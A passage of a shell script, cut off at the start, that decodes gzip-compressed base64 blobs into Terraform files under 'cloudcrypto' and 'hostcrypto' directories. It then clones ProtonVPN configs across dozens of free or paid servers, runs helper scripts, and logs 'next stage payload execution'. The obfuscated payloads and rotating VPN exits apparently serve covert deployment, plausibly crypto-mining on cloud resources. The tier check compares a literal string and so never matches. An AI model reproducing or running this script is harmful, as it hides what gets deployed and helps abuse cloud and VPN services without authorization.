seTVM3qjt73rGJ2cnMISk6GKVNWr96gzp5dGmKuEjxfrcvT60L4iuL5JThViq34Fk7u5+W9qFQWFpGu72yDRUZNl7tRv8FAAD//wEAAP//vh+5AfISAAA=' | base64 -d | gunzip > //cloud-tunnel/terraform/scripts/cloudcrypto/main.tf
echo 'H4sIAAAAAAAA/1JW1E/KzNMvzuDiAjNKUouKEtPyi3IVMvMyS9DFEgsKcioVdBNLS/J1EwsKivLLUrmKc1JTCxQMjQwM0FWnpBaXFOWjqQcAAAD//wEAAP//YkmPonEAAAA=' | base64 -d | gunzip > //cloud-tunnel/terraform/scripts/cloudcrypto/terraform.sh
echo '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' | base64 -d | gunzip > //cloud-tunnel/terraform/scripts/hostcrypto/main.tf
echo 'H4sIAAAAAAAA/1JW1E/KzNMvzuDiAjNKUouKEtPyi3IVMvMyS9DFEgsKcioVdBNLS/J1EwsKivLLUrmKc1JTCxQMjQwM0FWnpBaXFOWjqQcAAAD//wEAAP//YkmPonEAAAA=' | base64 -d | gunzip > //cloud-tunnel/terraform/scripts/hostcrypto/terraform.sh
log "Starting as background job..."
if [ "protonvpn_tier" == "0" ]; then
    for i in $(echo "US NL-FREE#1 JP-FREE#3 NL-FREE#4 NL-FREE#8 US-FREE#5 NL-FREE#9 NL-FREE#12 NL-FREE#13 NL-FREE#14 NL-FREE#15 NL-FREE#16 US-FREE#13 US-FREE#32 US-FREE#33 US-FREE#34 NL-FREE#39 NL-FREE#52 NL-FREE#57 NL-FREE#87 NL-FREE#133 NL-FREE#136 NL-FREE#148 US-FREE#52 US-FREE#53 US-FREE#54 US-FREE#51 NL-FREE#163 NL-FREE#164 US-FREE#58 US-FREE#57 US-FREE#56 US-FREE#55"); do cp .env-protonvpn .env-protonvpn-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-$i; done
    /bin/bash auto-free.sh
else
    for i in $(echo "AU CR IS JP LV NL NZ SG SK US"); do cp .env-protonvpn-paid .env-protonvpn-paid-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-paid-$i; done
    /bin/bash auto-paid.sh
fi;
log "Done."

log "done next stage payload execution."

log "Done"